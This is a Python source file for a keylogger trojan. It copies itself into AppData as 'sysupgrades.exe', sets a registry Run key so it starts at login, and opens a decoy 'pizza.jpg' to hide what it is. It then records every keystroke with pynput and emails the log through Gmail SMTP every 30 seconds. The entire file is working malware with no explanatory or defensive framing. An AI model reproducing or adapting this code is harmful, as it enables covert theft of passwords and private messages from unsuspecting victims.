import pynput.keyboard
import smtplib
import threading
import time
import subprocess
import os
import shutil
import sys


def add_to_registry():
	#persistence
	new_file = os.environ["appdata"] + "\\sysupgrades.exe"
	if not os.path.exists(new_file):
		shutil.copyfile(sys.executable,new_file)
		regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
		subprocess.call(regedit_command, shell=True)
                
add_to_registry()


def open_added_file():
     added_file = sys._MEIPASS + "\\pizza.jpg"
     subprocess.Popen(added_file, shell=True)

open_added_file()


log = ""

def callback_function(key):
    global log
    try:
        #log = log + key.char.encode('utf-8')
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread - threading

def thread_function():
    global log
    send_email("", "", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

packet_listener = pynput.keyboard.Listener(on_press=callback_function)
with packet_listener:
    thread_function()
    packet_listener.join()


